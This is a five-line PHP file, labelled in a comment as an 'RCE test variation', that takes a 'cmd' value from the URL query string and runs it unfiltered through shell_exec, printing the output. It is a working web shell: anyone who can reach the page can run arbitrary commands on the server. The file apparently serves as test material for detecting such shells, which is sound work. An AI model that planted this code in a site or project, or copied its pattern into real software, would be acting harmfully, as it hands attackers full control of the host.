<?php
// RCE test variation #1006
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>